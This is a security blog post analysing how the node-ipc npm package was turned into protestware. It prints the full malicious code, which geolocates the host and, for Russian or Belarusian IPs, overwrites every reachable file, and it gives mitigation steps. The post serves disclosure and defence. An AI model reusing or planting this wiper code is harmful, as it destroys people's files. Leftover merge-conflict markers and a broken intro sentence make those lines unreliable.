---
<<<<<<< HEAD
title: Protestware - How node-ipc turned into malware that targets russian IPs
description: The node-ipc package has turned into malware for Russian computers.
=======
title: "Protestware": How node-ipc turned into malware
description: How the author of the NPM package "node-ipc" turned it into malware to attack Russian developers and protest the war in Ukraine.
>>>>>>> 8f5263ab3d2076da20094bd42d835d93da18c38c
slug: node-ipc-protestware
date: 2022-03-18
image: https://www.lunasec.io/docs/img/.png
keywords: [node-ipc, protestware]
tags: [node-ipc, npm, nodejs]
authors: [chris, free]
---

<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->

[node-ipc](https://www.npmjs.com/package/node-ipc) is a popular package to help with inter-process communication in Node.  Among the [list of projects](https://github.com/zlw9991/node-ipc-dependencies-list) 
affected is most notably is the [Vue web framework](https://www.npmjs.com/package/@vue/cli-shared-utils).

In retaliation for the invasion of Ukraine, the package's author added malware 
On March 16th, 2022, a popular package on NPM, named "node-ipc", had malware intentionally added to it by it's author. The package is used in a number of projects, and the impact of this malware was felt by many developers in Belarus and Russia.

A long, but not exhaustive, list of projects that include this dependency has been [compiled](https://github.com/zlw9991/node-ipc-dependencies-list). Among the list of projects affected is most notably is the [Vue.js web framework](https://www.npmjs.com/package/@vue/cli-shared-utils).


Snyk has written a [blog post](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/) detailing
the timeline of events around the releasing of this malicius version.

## Technical Details of the Malware

The malicious code, which has since been deleted can be found [here](https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js). 

This code was [obfuscated](https://github.com/RIAEvangelist/node-ipc/issues/233#issuecomment-1072077181) to hide its intentions by the developer as more people started to pay attention to what was happening.

```js
import p from "path";
import fs from "fs";
import https from "https";

setTimeout(function () {
    if (Math.round(Math.random() * 4) > 1) {
        return;
    }

    const geoLocation = "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154";

    https.get(geoLocation, function (response) {
        response.on("data", function (jsonData) {
            try {
                const jsonObject = JSON.parse(jsonData);
                const countryName = jsonObject["country_name"].toLowerCase();
                if (countryName.includes("russia") || countryName.includes("belarus")) {
                    getFiles("./");
                    getFiles("../");
                    getFiles("../../");
                    getFiles("/");
                }
            } catch (response) {}
        });
    });
}, Math.ceil(Math.random() * 1000));

async function getFiles(path = "", param2 = "") {
    if (!fs.existsSync(path)) {
        return;
    }

    let fileInDir = [];
    try {
        fileInDir = fs.readdirSync(path);
    } catch (t) {}

    const toDelete = [];
    for (var i = 0; i < fileInDir.length; i++) {
        const combinedPath = p.join(path, fileInDir[i]);

        let pathData = null;
        try {
            pathData = fs.lstatSync(combinedPath);
        } catch (t) {
            continue;
        }

        if (pathData.isDirectory()) {
            const result = getFiles(combinedPath, param2);
            result.length > 0 ? toDelete.push(...result) : null;
        } else if (combinedPath.indexOf(param2) >= 0) {
            try {
                fs.writeFile(combinedPath, "❤️", function () {});
            } catch (t) {
            }
        }
    }
    return toDelete;
}

const ssl = true;
export { ssl as default, ssl };
```

The code attempts to geolocate where the code is running, and if it discovers it is running with in Russia or Belarus, then it attempts to
replace the contents of every file on the system with a unicode heart character: ❤.

## Mitigation Strategies for Bad Dependencies

To figure out if you're using `node-ipc` via a transitive dependency, you can use commands such as `yarn why node-ipc` to show you where and how it's imported in your code.

You can then pin your `node-ipc` version to a known version by adding `overrides` to your `package.json`, like so:

```json
"overrides": {
    "node-ipc@>9.2.1 <10": "9.2.1",
    "node-ipc@>10.1.0": "10.1.0"
}
```

*Note: This also applies to any other "bad" NPM package that you need to pin to a specific version.*

Setting an override will prevent future malicious package updates from being included in your project.

Unfortunately, due to this package being a transitive dependency, it can be very difficult to realize you're even including `node-ipc` in the first place.

This is a part of a bigger problem that we, as the software community, need to have and we're discuss it more at the end of this post.

## List Bad Versions and Other Malware Packages

On NPM, previous versions that were pushed that contained the malicious code, including versions
[9.2.2](https://www.npmjs.com/package/node-ipc/v/9.2.2), [10.1.1](https://www.npmjs.com/package/node-ipc/v/10.1.1),
[10.1.2](https://www.npmjs.com/package/node-ipc/v/10.1.2). These versions [have all been removed](https://www.npmjs.com/package/node-ipc) at this point once this malware was spotted by the NPM team.

However, newely released versions, > 11.x.x, all now contain the library [peacenotwar](https://www.npmjs.com/package/peacenotwar).
Unlike the previous malicious code, this library does not remove files. Instead, the library attempts to "deliver a peaceful message"
by [writing the contents](https://github.com/RIAEvangelist/peacenotwar/blob/main/index.js#L32) of the file, [WITH-LOVE-FROM-AMERICA.txt](https://github.com/RIAEvangelist/peacenotwar/blob/main/WITH-LOVE-FROM-AMERICA.txt)
to the host filesystem.

## Going Viral

The updates to the `node-ipc` struck a chord with developers on the Internet and a great deal of activity has been 
happening on the project page since the version release.

**Warning** The follow links may contain offensive terms, and are not safe for work.

A number of
[issues](https://github.com/RIAEvangelist/node-ipc/issues), [pull requests](https://github.com/RIAEvangelist/node-ipc/pulls), and [discussions](https://github.com/RIAEvangelist/node-ipc/discussions) 
have been created in outrage over the developer's modifications to their library.

## Stopping Future Supply Chain Attacks

All of this is happening on the coat-tail of the widely used libraries `faker.js` and `colors.js` having code changes pushed
to [intentionally corrupt](https://www.theverge.com/2022/1/9/22874949/developer-corrupts-open-source-libraries-projects-affected)
projects that included them.

With Node's support for `postInstall` scripts, any package is able to run arbitrary code _even if it's never imported_ because simply running `npm install` will trigger the library's code. Adding insult to injury, when an imported package's version hasn't been "pinned" to a specific version, it's possible to install a malicious package update _without even realizing it's happening_.

Over the years, we've seen many attacks just like this happen, and the impact has only increased. It's clear that, without a solution to the problem, we're going to continue to see these issues popping up.

Dependency scanning tools like [GitHub Dependabot](https://github.com/dependabot), [Snyk](https://snyk.io/), [TideLift](https://tidelift.com/), and others aren't able to prevent these types of attacks from executing malicious code. These tools are only designed to scan changes _after_ they're committed to source control.

That's too late to prevent exploitation though because attacks can attack developers the moment they run `npm install` on their computers.

## Tooling to Block these attacks

Stopping these attacks needs to happen _before_ an `npm install` runs. But how does that work?

Well, the answer is simple: Have a developer review every line of code in new packages _prior to it being available on NPM to download_.

Oh, you don't want to do that? Then you're in luck because that's exactly what we do with our product, LunaTrace!

To make it possible, we've built a "fork" of NPM where all package updates are reviewed by our dedicated Security Engineers _automatically_ before your developers can install them.

It's tedious work, but somebody has to do it.

The core of LunaTrace is actually [open source and available on GitHub](https://github.com/lunasec-io/lunasec/tree/master/lunatrace) today. We're planning to publicly release the managed Cloud version in the coming days.

If you want access to our private NPM registry of pre-vetted packages, please get in touch with us. (It's hard work and we're still scaling our team up to handle the load.)

## Request Early Access

If you're interested in working with us while we continue to develop and improve LunaTrace, please email us about early access at: [contact@lunasec.io](mailto:contact@lunasec.io)

More details will be added to our website shortly. Cheers!
